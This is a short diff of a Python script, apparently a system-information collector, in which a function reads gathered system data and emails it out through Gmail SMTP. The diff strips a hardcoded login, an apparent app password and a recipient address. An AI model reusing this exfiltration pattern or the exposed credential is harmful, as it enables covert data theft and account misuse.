@@ -16,8 +16,8 @@ def send_sys_infs():
     sysdata = file.read()
     obj = smtplib.SMTP('smtp.gmail.com', 587)
     obj.starttls()
-    obj.login('yourpassyourpass@gmail.com', 'aeuc eyrl lapk xwbs')
-    obj.sendmail('yourpassyourpass@gmail.com', 'surajsundar407@gmail.com', sysdata)
+    obj.login('', '')
+    obj.sendmail('', '', sysdata)
     obj.quit()
 
 def public_ip_data():
